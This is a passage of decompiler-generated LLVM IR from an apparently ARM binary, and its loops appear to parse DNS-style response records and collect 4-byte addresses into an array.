dec_label_pc_faec:                                ; preds = %dec_label_pc_fae4
  %v0_faec = load i32, i32* @r5, align 4
  %v1_faec = add i32 %v0_faec, -156
  %v2_faec = inttoptr i32 %v1_faec to i32*
  %v3_faec = load i32, i32* %v2_faec, align 4
  %v1_faf0 = load i32, i32* @r7, align 4
  %v6_faf0 = lshr i32 %v3_faec, %v1_faf0
  store i32 %v6_faf0, i32* %r3.global-to-local, align 4
  %v1_faf4 = urem i32 %v6_faf0, 2
  %v2_faf4 = icmp eq i32 %v1_faf4, 0
  store i1 %v2_faf4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_faf4, label %dec_label_pc_fb60, label %dec_label_pc_fafc

dec_label_pc_fafc:                                ; preds = %dec_label_pc_faec
  store i32 %v2_fb00, i32* @r5, align 4
  store i32 %v2_fb00, i32* @r1, align 4
  store i32 2048, i32* @r2, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_fb10 = load i32, i32* @r6, align 4
  store i32 %v0_fb10, i32* @r0, align 4
  %v0_fb1c = call i32 @function_14a78()
  store i32 %v0_fb1c, i32* %r4.global-to-local, align 4
  %v0_fb24 = load i32, i32* @sb, align 4
  store i32 %v0_fb24, i32* %r0.global-to-local, align 4
  %v1_fb28 = inttoptr i32 %v0_fb24 to i8*
  %v2_fb28 = call i32 @function_12370(i8* %v1_fb28)
  %v1_fb2c = add i32 %v2_fb28, 17
  store i32 %v1_fb2c, i32* %r0.global-to-local, align 4
  %v0_fb30 = load i32, i32* %r4.global-to-local, align 4
  %v3_fb30 = icmp ult i32 %v0_fb30, %v1_fb2c
  %v9_fb30 = icmp eq i32 %v0_fb30, %v1_fb2c
  store i1 %v9_fb30, i1* %cpsr_z.global-to-local, align 1
  store i32 -4252, i32* @r4, align 4
  br i1 %v3_fb30, label %dec_label_pc_fb40, label %dec_label_pc_fb94

dec_label_pc_fb40:                                ; preds = %dec_label_pc_fafc, %dec_label_pc_fb94, %dec_label_pc_fbc0, %dec_label_pc_fae4, %dec_label_pc_fb88
  %v0_fb40 = load i32, i32* @r8, align 4
  %v7_fb40 = icmp eq i32 %v0_fb40, 5
  store i1 %v7_fb40, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fb40, label %dec_label_pc_fb60, label %dec_label_pc_fb48

dec_label_pc_fb48:                                ; preds = %dec_label_pc_fb50, %dec_label_pc_fb40
  %v0_fb48 = phi i32 [ %v0_fb58, %dec_label_pc_fb50 ], [ %v0_fb40, %dec_label_pc_fb40 ]
  %v1_fb48 = add i32 %v0_fb48, 1
  %v0_f9dc.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_f9dc

dec_label_pc_fb50:                                ; preds = %dec_label_pc_fa1c, %dec_label_pc_fa04
  %v0_fb50 = phi i32 [ %v4_fa2c, %dec_label_pc_fa1c ], [ %v3_fa10, %dec_label_pc_fa04 ]
  %v1_fb50 = add i32 %v0_fb50, 2
  store i32 %v1_fb50, i32* %r0.global-to-local, align 4
  %v1_fb54 = call i32 @function_15c58(i32 %v1_fb50)
  store i32 %v1_fb54, i32* %r0.global-to-local, align 4
  %v0_fb58 = load i32, i32* @r8, align 4
  %v7_fb58 = icmp eq i32 %v0_fb58, 5
  store i1 %v7_fb58, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fb58, label %dec_label_pc_fb60, label %dec_label_pc_fb48

dec_label_pc_fb60:                                ; preds = %dec_label_pc_fb50, %dec_label_pc_fb40, %dec_label_pc_faec, %dec_label_pc_fa84, %dec_label_pc_fbcc, %dec_label_pc_fbd4.backedge
  %v0_fb60 = load i32, i32* @r6, align 4
  store i32 %v0_fb60, i32* @r0, align 4
  %v1_fb64 = call i32 @function_15b6c(i32 %v0_fb60)
  store i32 %v1_fb64, i32* %r0.global-to-local, align 4
  %v0_fb68 = load i32, i32* @fp, align 4
  %v1_fb68 = inttoptr i32 %v0_fb68 to i8*
  %v2_fb68 = load i8, i8* %v1_fb68, align 1
  %v3_fb68 = zext i8 %v2_fb68 to i32
  store i32 %v3_fb68, i32* @r4, align 4
  %v2_fb6c = icmp eq i8 %v2_fb68, 0
  store i1 %v2_fb6c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_fb6c, label %dec_label_pc_fcb4, label %dec_label_pc_fb74

dec_label_pc_fb74:                                ; preds = %dec_label_pc_fb60, %dec_label_pc_fcb4
  %v0_fb74 = phi i32 [ %v0_fb68, %dec_label_pc_fb60 ], [ %v0_fcc8, %dec_label_pc_fcb4 ]
  store i32 %v0_fb74, i32* %r0.global-to-local, align 4
  store i32 %v3_f874, i32* @r4, align 4
  store i32 %v9_f874, i32* @r6, align 4
  store i32 %v12_f874, i32* @r7, align 4
  store i32 %v15_f874, i32* @r8, align 4
  store i32 %v18_f874, i32* @sb, align 4
  store i32 %v21_f874, i32* @sl, align 4
  store i32 %v24_f874, i32* @fp, align 4
  store i32 %v27_f874, i32* @lr, align 4
  ret i32 %v0_fb74

dec_label_pc_fb88:                                ; preds = %bb117
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_fb8c = call i32 @function_15c58(i32 1)
  store i32 %v1_fb8c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_fb40

dec_label_pc_fb94:                                ; preds = %dec_label_pc_fafc
  store i32 %v2_fb94, i32* @sb, align 4
  store i32 %v2_fb94, i32* %r0.global-to-local, align 4
  %v2_fb9c = call i32 @function_12370(i8* %v1_fb9c)
  store i32 %v2_fa90, i32* @lr, align 4
  %v4_fba8 = load i16, i16* %stack_var_-4292, align 2
  %v5_fba8 = sext i16 %v4_fba8 to i32
  store i32 %v5_fba8, i32* %r3.global-to-local, align 4
  store i32 %v6_f944, i32* %r1.global-to-local, align 4
  %v1_fbb0 = load i32, i32* @sb, align 4
  %v2_fbb0 = add i32 %v1_fbb0, %v2_fb9c
  store i32 %v2_fbb0, i32* %r0.global-to-local, align 4
  %v9_fbb4 = icmp eq i16 %v4_fba8, %v5_f95c
  store i1 %v9_fbb4, i1* %cpsr_z.global-to-local, align 1
  %v1_fbb8 = add i32 %v2_fbb0, 5
  store i32 %v1_fbb8, i32* @r4, align 4
  br i1 %v9_fbb4, label %dec_label_pc_fbc0, label %dec_label_pc_fb40

dec_label_pc_fbc0:                                ; preds = %dec_label_pc_fb94
  store i32 %v4_fbc0, i32* %r0.global-to-local, align 4
  store i1 %v2_fbc4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_fbc4, label %dec_label_pc_fb40, label %dec_label_pc_fbcc

dec_label_pc_fbcc:                                ; preds = %dec_label_pc_fbc0
  %v1_fbcc = call i32 @function_14a40(i32 %v4_fbc0)
  store i32 %v1_fbcc, i32* %r0.global-to-local, align 4
  %v1_fbd4133 = add i32 %v1_fbcc, -1
  %v3_fbd8134 = mul i32 %v1_fbd4133, 65536
  store i32 %v3_fbd8134, i32* %r3.global-to-local, align 4
  %v7_fbdc140 = icmp eq i32 %v3_fbd8134, -65536
  store i1 %v7_fbdc140, i1* %cpsr_z.global-to-local, align 1
  %v3_fbe0141 = urem i32 %v1_fbd4133, 65536
  store i32 %v3_fbe0141, i32* @sl, align 4
  br i1 %v7_fbdc140, label %dec_label_pc_fb60, label %dec_label_pc_fbe8.lr.ph

dec_label_pc_fbe8.lr.ph:                          ; preds = %dec_label_pc_fbcc
  %v0_fbe8.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_fbe8

dec_label_pc_fbe8:                                ; preds = %dec_label_pc_fbe8.lr.ph, %dec_label_pc_fbd4.backedge
  %v0_fbe8 = phi i32 [ %v0_fbe8.pre, %dec_label_pc_fbe8.lr.ph ], [ %storemerge29, %dec_label_pc_fbd4.backedge ]
  store i32 %v0_fbe8, i32* %r3.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_fbf418 = inttoptr i32 %v0_fbe8 to i8*
  %v2_fbf419 = load i8, i8* %v1_fbf418, align 1
  %v3_fbf420 = zext i8 %v2_fbf419 to i32
  store i32 %v3_fbf420, i32* %r2.global-to-local, align 4
  %v2_fbf821 = icmp eq i8 %v2_fbf419, 0
  store i1 %v2_fbf821, i1* %cpsr_z.global-to-local, align 1
  %v3_fbfc22 = mul nuw nsw i32 %v3_fbf420, 256
  store i32 %v3_fbfc22, i32* %r1.global-to-local, align 4
  br i1 %v2_fbf821, label %dec_label_pc_fc30, label %dec_label_pc_fc04.preheader

dec_label_pc_fc04.preheader:                      ; preds = %dec_label_pc_fbe8, %dec_label_pc_fbf4.backedge
  %v1_fcd8 = phi i32 [ %v1_fcd849, %dec_label_pc_fbf4.backedge ], [ 1, %dec_label_pc_fbe8 ]
  %v0_fcd047 = phi i32 [ %v0_fcd0, %dec_label_pc_fbf4.backedge ], [ 0, %dec_label_pc_fbe8 ]
  %v0_fc1045 = phi i32 [ %v3_fbfc, %dec_label_pc_fbf4.backedge ], [ %v3_fbfc22, %dec_label_pc_fbe8 ]
  %v0_fc0c43 = phi i32 [ %v1_fcd4, %dec_label_pc_fbf4.backedge ], [ %v0_fbe8, %dec_label_pc_fbe8 ]
  %v0_fc0441 = phi i32 [ %v3_fbf4, %dec_label_pc_fbf4.backedge ], [ %v3_fbf420, %dec_label_pc_fbe8 ]
  br label %dec_label_pc_fc04

dec_label_pc_fc04:                                ; preds = %dec_label_pc_fc04.preheader, %dec_label_pc_fc0c
  %v0_fcd0 = phi i32 [ %v0_fcd047, %dec_label_pc_fc04.preheader ], [ 1, %dec_label_pc_fc0c ]
  %v0_fc10 = phi i32 [ %v0_fc1045, %dec_label_pc_fc04.preheader ], [ %v3_fc28, %dec_label_pc_fc0c ]
  %v0_fcd4 = phi i32 [ %v0_fc0c43, %dec_label_pc_fc04.preheader ], [ %v2_fc18, %dec_label_pc_fc0c ]
  %v0_fc04 = phi i32 [ %v0_fc0441, %dec_label_pc_fc04.preheader ], [ %v3_fc1c, %dec_label_pc_fc0c ]
  %v7_fc04 = icmp eq i32 %v0_fc04, 191
  store i1 %v7_fc04, i1* %cpsr_z.global-to-local, align 1
  %tmp = icmp ult i32 %v0_fc04, 192
  br i1 %tmp, label %dec_label_pc_fcd0, label %dec_label_pc_fc0c

dec_label_pc_fc0c:                                ; preds = %dec_label_pc_fc04
  %v1_fc0c = add i32 %v0_fcd4, 1
  %v2_fc0c = inttoptr i32 %v1_fc0c to i8*
  %v3_fc0c = load i8, i8* %v2_fc0c, align 1
  %v4_fc0c = zext i8 %v3_fc0c to i32
  %v2_fc10 = or i32 %v4_fc0c, -49152
  %v0_fc18 = load i32, i32* @r5, align 4
  %v1_fc14 = add i32 %v0_fc18, %v0_fc10
  %v2_fc18 = add i32 %v1_fc14, %v2_fc10
  store i32 %v2_fc18, i32* %r3.global-to-local, align 4
  %v1_fc1c = inttoptr i32 %v2_fc18 to i8*
  %v2_fc1c = load i8, i8* %v1_fc1c, align 1
  %v3_fc1c = zext i8 %v2_fc1c to i32
  store i32 %v3_fc1c, i32* %r2.global-to-local, align 4
  %v2_fc20 = icmp eq i8 %v2_fc1c, 0
  store i1 %v2_fc20, i1* %cpsr_z.global-to-local, align 1
  store i32 1, i32* %ip.global-to-local, align 4
  %v3_fc28 = mul nuw nsw i32 %v3_fc1c, 256
  store i32 %v3_fc28, i32* %r1.global-to-local, align 4
  br i1 %v2_fc20, label %dec_label_pc_fc30, label %dec_label_pc_fc04

dec_label_pc_fc30:                                ; preds = %dec_label_pc_fbf4.backedge, %dec_label_pc_fc0c, %dec_label_pc_fbe8
  %v1_fc34 = phi i32 [ 1, %dec_label_pc_fbe8 ], [ %v1_fcd8, %dec_label_pc_fc0c ], [ %v1_fcd849, %dec_label_pc_fbf4.backedge ]
  %v0_fc30 = phi i32 [ 0, %dec_label_pc_fbe8 ], [ 1, %dec_label_pc_fc0c ], [ %v0_fcd0, %dec_label_pc_fbf4.backedge ]
  %v7_fc30 = icmp eq i32 %v0_fc30, 1
  store i1 %v7_fc30, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fc30, label %bb118, label %bb119

bb118:                                            ; preds = %dec_label_pc_fc30
  %v2_fc34 = add i32 %v1_fc34, 1
  store i32 %v2_fc34, i32* %r0.global-to-local, align 4
  br label %bb119

bb119:                                            ; preds = %dec_label_pc_fc30, %bb118
  %v1_fc40 = phi i32 [ %v1_fc34, %dec_label_pc_fc30 ], [ %v2_fc34, %bb118 ]
  %v2_fc38 = add i32 %v1_fc40, %v0_fbe8
  store i32 %v2_fc38, i32* @r7, align 4
  %v1_fc3c = add i32 %v2_fc38, 1
  %v2_fc3c = inttoptr i32 %v1_fc3c to i8*
  %v3_fc3c = load i8, i8* %v2_fc3c, align 1
  %v4_fc3c = zext i8 %v3_fc3c to i32
  store i32 %v4_fc3c, i32* %r3.global-to-local, align 4
  %v3_fc40 = inttoptr i32 %v2_fc38 to i8*
  %v4_fc40 = load i8, i8* %v3_fc40, align 1
  %v6_fc40 = zext i8 %v4_fc40 to i32
  store i32 1, i32* %r0.global-to-local, align 4
  %v4_fc48 = mul nuw nsw i32 %v4_fc3c, 256
  %v5_fc48 = or i32 %v6_fc40, %v4_fc48
  store i32 %v5_fc48, i32* %r4.global-to-local, align 4
  %v1_fc4c = call i32 @function_14898(i32 1)
  store i32 %v1_fc4c, i32* %r0.global-to-local, align 4
  %v9_fc50 = icmp eq i32 %v5_fc48, %v1_fc4c
  store i1 %v9_fc50, i1* %cpsr_z.global-to-local, align 1
  %v0_fc54 = load i32, i32* @r7, align 4
  %v1_fc54 = add i32 %v0_fc54, 10
  store i32 %v1_fc54, i32* @r8, align 4
  br i1 %v9_fc50, label %dec_label_pc_fcf0, label %dec_label_pc_fc5c

dec_label_pc_fc5c:                                ; preds = %dec_label_pc_fcf0.dec_label_pc_fc5c_crit_edge, %bb119
  %v0_fcac = phi i32 [ %v0_fc5c.pre, %dec_label_pc_fcf0.dec_label_pc_fc5c_crit_edge ], [ %v1_fc54, %bb119 ]
  store i32 %v0_fcac, i32* %r3.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_fc6824 = inttoptr i32 %v0_fcac to i8*
  %v2_fc6825 = load i8, i8* %v1_fc6824, align 1
  %v3_fc6826 = zext i8 %v2_fc6825 to i32
  store i32 %v3_fc6826, i32* %r2.global-to-local, align 4
  %v2_fc6c27 = icmp eq i8 %v2_fc6825, 0
  store i1 %v2_fc6c27, i1* %cpsr_z.global-to-local, align 1
  %v3_fc7028 = mul nuw nsw i32 %v3_fc6826, 256
  store i32 %v3_fc7028, i32* %r1.global-to-local, align 4
  br i1 %v2_fc6c27, label %dec_label_pc_fca4, label %dec_label_pc_fc78.preheader

dec_label_pc_fc78.preheader:                      ; preds = %dec_label_pc_fc5c, %dec_label_pc_fc68.backedge
  %v1_fce8 = phi i32 [ %v1_fce865, %dec_label_pc_fc68.backedge ], [ 1, %dec_label_pc_fc5c ]
  %v0_fce063 = phi i32 [ %v0_fce0, %dec_label_pc_fc68.backedge ], [ 0, %dec_label_pc_fc5c ]
  %v0_fc8461 = phi i32 [ %v3_fc70, %dec_label_pc_fc68.backedge ], [ %v3_fc7028, %dec_label_pc_fc5c ]
  %v0_fc8059 = phi i32 [ %v1_fce4, %dec_label_pc_fc68.backedge ], [ %v0_fcac, %dec_label_pc_fc5c ]
  %v0_fc7857 = phi i32 [ %v3_fc68, %dec_label_pc_fc68.backedge ], [ %v3_fc6826, %dec_label_pc_fc5c ]
  br label %dec_label_pc_fc78

dec_label_pc_fc78:                                ; preds = %dec_label_pc_fc78.preheader, %dec_label_pc_fc80
  %v0_fce0 = phi i32 [ %v0_fce063, %dec_label_pc_fc78.preheader ], [ 1, %dec_label_pc_fc80 ]
  %v0_fc84 = phi i32 [ %v0_fc8461, %dec_label_pc_fc78.preheader ], [ %v3_fc9c, %dec_label_pc_fc80 ]
  %v0_fce4 = phi i32 [ %v0_fc8059, %dec_label_pc_fc78.preheader ], [ %v2_fc8c, %dec_label_pc_fc80 ]
  %v0_fc78 = phi i32 [ %v0_fc7857, %dec_label_pc_fc78.preheader ], [ %v3_fc90, %dec_label_pc_fc80 ]
  %v7_fc78 = icmp eq i32 %v0_fc78, 191
  store i1 %v7_fc78, i1* %cpsr_z.global-to-local, align 1
  %tmp157 = icmp ult i32 %v0_fc78, 192
  br i1 %tmp157, label %dec_label_pc_fce0, label %dec_label_pc_fc80

dec_label_pc_fc80:                                ; preds = %dec_label_pc_fc78
  %v1_fc80 = add i32 %v0_fce4, 1
  %v2_fc80 = inttoptr i32 %v1_fc80 to i8*
  %v3_fc80 = load i8, i8* %v2_fc80, align 1
  %v4_fc80 = zext i8 %v3_fc80 to i32
  %v2_fc84 = or i32 %v4_fc80, -49152
  %v0_fc8c = load i32, i32* @r5, align 4
  %v1_fc88 = add i32 %v0_fc8c, %v0_fc84
  %v2_fc8c = add i32 %v1_fc88, %v2_fc84
  store i32 %v2_fc8c, i32* %r3.global-to-local, align 4
  %v1_fc90 = inttoptr i32 %v2_fc8c to i8*
  %v2_fc90 = load i8, i8* %v1_fc90, align 1
  %v3_fc90 = zext i8 %v2_fc90 to i32
  store i32 %v3_fc90, i32* %r2.global-to-local, align 4
  %v2_fc94 = icmp eq i8 %v2_fc90, 0
  store i1 %v2_fc94, i1* %cpsr_z.global-to-local, align 1
  store i32 1, i32* %ip.global-to-local, align 4
  %v3_fc9c = mul nuw nsw i32 %v3_fc90, 256
  store i32 %v3_fc9c, i32* %r1.global-to-local, align 4
  br i1 %v2_fc94, label %dec_label_pc_fca4, label %dec_label_pc_fc78

dec_label_pc_fca4:                                ; preds = %dec_label_pc_fc68.backedge, %dec_label_pc_fc80, %dec_label_pc_fc5c
  %v1_fca8 = phi i32 [ 1, %dec_label_pc_fc5c ], [ %v1_fce8, %dec_label_pc_fc80 ], [ %v1_fce865, %dec_label_pc_fc68.backedge ]
  %v0_fca4 = phi i32 [ 0, %dec_label_pc_fc5c ], [ 1, %dec_label_pc_fc80 ], [ %v0_fce0, %dec_label_pc_fc68.backedge ]
  %v7_fca4 = icmp eq i32 %v0_fca4, 1
  store i1 %v7_fca4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fca4, label %bb120, label %bb121

bb120:                                            ; preds = %dec_label_pc_fca4
  %v2_fca8 = add i32 %v1_fca8, 1
  store i32 %v2_fca8, i32* %r0.global-to-local, align 4
  br label %bb121

bb121:                                            ; preds = %dec_label_pc_fca4, %bb120
  %v1_fcac = phi i32 [ %v1_fca8, %dec_label_pc_fca4 ], [ %v2_fca8, %bb120 ]
  %v2_fcac = add i32 %v1_fcac, %v0_fcac
  br label %dec_label_pc_fbd4.backedge

dec_label_pc_fbd4.backedge:                       ; preds = %bb121, %dec_label_pc_fd80
  %storemerge29 = phi i32 [ %v2_fcac, %bb121 ], [ %v2_fd90, %dec_label_pc_fd80 ]
  store i32 %storemerge29, i32* @r4, align 4
  %v0_fbd4.pre = load i32, i32* @sl, align 4
  %v1_fbd4 = add i32 %v0_fbd4.pre, -1
  %v3_fbd8 = mul i32 %v1_fbd4, 65536
  store i32 %v3_fbd8, i32* %r3.global-to-local, align 4
  %v7_fbdc = icmp eq i32 %v3_fbd8, -65536
  store i1 %v7_fbdc, i1* %cpsr_z.global-to-local, align 1
  %v3_fbe0 = urem i32 %v1_fbd4, 65536
  store i32 %v3_fbe0, i32* @sl, align 4
  br i1 %v7_fbdc, label %dec_label_pc_fb60, label %dec_label_pc_fbe8

dec_label_pc_fcb4:                                ; preds = %dec_label_pc_fb60
  %v1_fcb4 = add i32 %v0_fb68, 4
  %v2_fcb4 = inttoptr i32 %v1_fcb4 to i32*
  %v3_fcb4 = load i32, i32* %v2_fcb4, align 4
  store i32 %v3_fcb4, i32* %r0.global-to-local, align 4
  %v2_fcb8 = icmp eq i32 %v3_fcb4, 0
  store i1 %v2_fcb8, i1* %cpsr_z.global-to-local, align 1
  store i32 ptrtoint (i32* @global_var_fcc0.190 to i32), i32* @lr, align 4
  %v1_fcbc = xor i1 %v2_fcb8, true
  call void @__pseudo_cond_branch(i1 %v1_fcbc, i32 ptrtoint (i32* @global_var_137cc.57 to i32))
  %v0_fcc0 = load i32, i32* @fp, align 4
  store i32 %v0_fcc0, i32* %r0.global-to-local, align 4
  %v1_fcc4 = call i32 @function_137cc(i32 %v0_fcc0)
  store i32 %v1_fcc4, i32* %r0.global-to-local, align 4
  %v0_fcc8 = load i32, i32* @r4, align 4
  br label %dec_label_pc_fb74

dec_label_pc_fcd0:                                ; preds = %dec_label_pc_fc04
  %v2_fcd0 = icmp eq i32 %v0_fcd0, 0
  store i1 %v2_fcd0, i1* %cpsr_z.global-to-local, align 1
  %v1_fcd4 = add i32 %v0_fcd4, 1
  store i32 %v1_fcd4, i32* %r3.global-to-local, align 4
  br i1 %v2_fcd0, label %bb122, label %dec_label_pc_fbf4.backedge

dec_label_pc_fbf4.backedge:                       ; preds = %dec_label_pc_fcd0, %bb122
  %v1_fcd849 = phi i32 [ %v1_fcd8, %dec_label_pc_fcd0 ], [ %v2_fcd8, %bb122 ]
  %v1_fbf4 = inttoptr i32 %v1_fcd4 to i8*
  %v2_fbf4 = load i8, i8* %v1_fbf4, align 1
  %v3_fbf4 = zext i8 %v2_fbf4 to i32
  store i32 %v3_fbf4, i32* %r2.global-to-local, align 4
  %v2_fbf8 = icmp eq i8 %v2_fbf4, 0
  store i1 %v2_fbf8, i1* %cpsr_z.global-to-local, align 1
  %v3_fbfc = mul nuw nsw i32 %v3_fbf4, 256
  store i32 %v3_fbfc, i32* %r1.global-to-local, align 4
  br i1 %v2_fbf8, label %dec_label_pc_fc30, label %dec_label_pc_fc04.preheader

bb122:                                            ; preds = %dec_label_pc_fcd0
  %v2_fcd8 = add i32 %v1_fcd8, 1
  store i32 %v2_fcd8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_fbf4.backedge

dec_label_pc_fce0:                                ; preds = %dec_label_pc_fc78
  %v2_fce0 = icmp eq i32 %v0_fce0, 0
  store i1 %v2_fce0, i1* %cpsr_z.global-to-local, align 1
  %v1_fce4 = add i32 %v0_fce4, 1
  store i32 %v1_fce4, i32* %r3.global-to-local, align 4
  br i1 %v2_fce0, label %bb123, label %dec_label_pc_fc68.backedge

dec_label_pc_fc68.backedge:                       ; preds = %dec_label_pc_fce0, %bb123
  %v1_fce865 = phi i32 [ %v1_fce8, %dec_label_pc_fce0 ], [ %v2_fce8, %bb123 ]
  %v1_fc68 = inttoptr i32 %v1_fce4 to i8*
  %v2_fc68 = load i8, i8* %v1_fc68, align 1
  %v3_fc68 = zext i8 %v2_fc68 to i32
  store i32 %v3_fc68, i32* %r2.global-to-local, align 4
  %v2_fc6c = icmp eq i8 %v2_fc68, 0
  store i1 %v2_fc6c, i1* %cpsr_z.global-to-local, align 1
  %v3_fc70 = mul nuw nsw i32 %v3_fc68, 256
  store i32 %v3_fc70, i32* %r1.global-to-local, align 4
  br i1 %v2_fc6c, label %dec_label_pc_fca4, label %dec_label_pc_fc78.preheader

bb123:                                            ; preds = %dec_label_pc_fce0
  %v2_fce8 = add i32 %v1_fce8, 1
  store i32 %v2_fce8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_fc68.backedge

dec_label_pc_fcf0:                                ; preds = %bb119
  %v1_fcf0 = add i32 %v0_fc54, 2
  %v2_fcf0 = inttoptr i32 %v1_fcf0 to i8*
  %v3_fcf0 = load i8, i8* %v2_fcf0, align 1
  %v4_fcf0 = zext i8 %v3_fcf0 to i32
  store i32 %v4_fcf0, i32* %r4.global-to-local, align 4
  %v1_fcf4 = add i32 %v0_fc54, 3
  %v2_fcf4 = inttoptr i32 %v1_fcf4 to i8*
  %v3_fcf4 = load i8, i8* %v2_fcf4, align 1
  %v4_fcf4 = zext i8 %v3_fcf4 to i32
  store i32 %v4_fcf4, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v4_fcfc = mul nuw nsw i32 %v4_fcf4, 256
  %v5_fcfc = or i32 %v4_fcfc, %v4_fcf0
  store i32 %v5_fcfc, i32* @r4, align 4
  %v1_fd00 = call i32 @function_14898(i32 1)
  store i32 %v1_fd00, i32* %r0.global-to-local, align 4
  %v0_fd04 = load i32, i32* @r4, align 4
  %v9_fd04 = icmp eq i32 %v0_fd04, %v1_fd00
  store i1 %v9_fd04, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_fd04, label %dec_label_pc_fd0c, label %dec_label_pc_fcf0.dec_label_pc_fc5c_crit_edge

dec_label_pc_fcf0.dec_label_pc_fc5c_crit_edge:    ; preds = %dec_label_pc_fcf0
  %v0_fc5c.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_fc5c

dec_label_pc_fd0c:                                ; preds = %dec_label_pc_fcf0
  %v0_fd0c = load i32, i32* @r7, align 4
  %v1_fd0c = add i32 %v0_fd0c, 8
  %v2_fd0c = inttoptr i32 %v1_fd0c to i8*
  %v3_fd0c = load i8, i8* %v2_fd0c, align 1
  %v4_fd0c = zext i8 %v3_fd0c to i32
  store i32 %v4_fd0c, i32* %r3.global-to-local, align 4
  %v1_fd10 = add i32 %v0_fd0c, 9
  %v2_fd10 = inttoptr i32 %v1_fd10 to i8*
  %v3_fd10 = load i8, i8* %v2_fd10, align 1
  %v4_fd10 = zext i8 %v3_fd10 to i32
  %v4_fd14 = mul nuw nsw i32 %v4_fd10, 256
  %v5_fd14 = or i32 %v4_fd14, %v4_fd0c
  store i32 %v5_fd14, i32* %r0.global-to-local, align 4
  %v1_fd18 = call i32 @function_14a40(i32 %v5_fd14)
  store i32 %v1_fd18, i32* %r0.global-to-local, align 4
  %v7_fd1c = icmp eq i32 %v1_fd18, 4
  store i1 %v7_fd1c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fd1c, label %dec_label_pc_fd24, label %dec_label_pc_fd80

dec_label_pc_fd24:                                ; preds = %dec_label_pc_fd0c
  %v0_fd24 = load i32, i32* @r7, align 4
  %v1_fd24 = add i32 %v0_fd24, 10
  %v2_fd24 = inttoptr i32 %v1_fd24 to i8*
  %v3_fd24 = load i8, i8* %v2_fd24, align 1
  %v4_fd24 = zext i8 %v3_fd24 to i32
  store i32 %v4_fd24, i32* %r3.global-to-local, align 4
  store i32 %v2_f90c, i32* %r2.global-to-local, align 4
  %v0_fd30 = load i32, i32* @r8, align 4
  %v1_fd30 = add i32 %v0_fd30, 1
  %v2_fd30 = inttoptr i32 %v1_fd30 to i8*
  %v3_fd30 = load i8, i8* %v2_fd30, align 1
  %v4_fd30 = zext i8 %v3_fd30 to i32
  store i32 %v4_fd30, i32* %r2.global-to-local, align 4
  store i32 %v2_f90c, i32* %r3.global-to-local, align 4
  %v1_fd3c = add i32 %v0_fd30, 2
  %v2_fd3c = inttoptr i32 %v1_fd3c to i8*
  %v3_fd3c = load i8, i8* %v2_fd3c, align 1
  %v4_fd3c = zext i8 %v3_fd3c to i32
  store i32 %v4_fd3c, i32* %r3.global-to-local, align 4
  store i32 %v2_f90c, i32* %ip.global-to-local, align 4
  %v1_fd48 = add i32 %v0_fd30, 3
  %v2_fd48 = inttoptr i32 %v1_fd48 to i8*
  %v3_fd48 = load i8, i8* %v2_fd48, align 1
  %v4_fd48 = zext i8 %v3_fd48 to i32
  store i32 %v4_fd48, i32* %r2.global-to-local, align 4
  %v0_fd50 = load i32, i32* @fp, align 4
  %v1_fd50 = inttoptr i32 %v0_fd50 to i8*
  %v2_fd50 = load i8, i8* %v1_fd50, align 1
  %v3_fd50 = zext i8 %v2_fd50 to i32
  %v1_fd54 = mul nuw nsw i32 %v3_fd50, 4
  %v3_fd58 = add nuw nsw i32 %v1_fd54, 4
  store i32 %v3_fd58, i32* %r1.global-to-local, align 4
  %v1_fd5c = add i32 %v0_fd50, 4
  %v2_fd5c = inttoptr i32 %v1_fd5c to i32*
  %v3_fd5c = load i32, i32* %v2_fd5c, align 4
  store i32 %v3_fd5c, i32* %r0.global-to-local, align 4
  %v3_fd60 = sext i8 %v3_fd48 to i32
  %v5_fd60 = sext i8 %v3_fd3c to i32
  %v10_fd60 = call i32 @function_14414(i32 %v3_fd5c, i32 %v3_fd58, i32 %v3_fd60, i32 %v5_fd60)
  store i32 %v10_fd60, i32* %r0.global-to-local, align 4
  %v0_fd64 = load i32, i32* @fp, align 4
  %v1_fd64 = inttoptr i32 %v0_fd64 to i8*
  %v2_fd64 = load i8, i8* %v1_fd64, align 1
  %v3_fd64 = zext i8 %v2_fd64 to i32
  store i32 %v3_fd64, i32* %r2.global-to-local, align 4
  store i32 %v2_f90c, i32* @lr, align 4
  %v4_fd6c = sext i8 %v3_fd24 to i32
  store i32 %v4_fd6c, i32* %r3.global-to-local, align 4
  %v1_fd70 = add nuw nsw i32 %v3_fd64, 1
  store i32 %v1_fd70, i32* %r1.global-to-local, align 4
  %v5_fd74 = mul nuw nsw i32 %v3_fd64, 4
  %v6_fd74 = add i32 %v5_fd74, %v10_fd60
  %v7_fd74 = inttoptr i32 %v6_fd74 to i32*
  store i32 %v4_fd6c, i32* %v7_fd74, align 4
  %v1_fd78 = load i32, i32* @fp, align 4
  %v2_fd78 = add i32 %v1_fd78, 4
  %v3_fd78 = inttoptr i32 %v2_fd78 to i32*
  store i32 %v10_fd60, i32* %v3_fd78, align 4
  %v0_fd7c = load i32, i32* %r1.global-to-local, align 4
  %v1_fd7c = trunc i32 %v0_fd7c to i8
  %v2_fd7c = load i32, i32* @fp, align 4
  %v3_fd7c = inttoptr i32 %v2_fd7c to i8*
  store i8 %v1_fd7c, i8* %v3_fd7c, align 1
  br label %dec_label_pc_fd80

dec_label_pc_fd80:                                ; preds = %dec_label_pc_fd0c, %dec_label_pc_fd24
  %v0_fd80 = load i32, i32* @r7, align 4
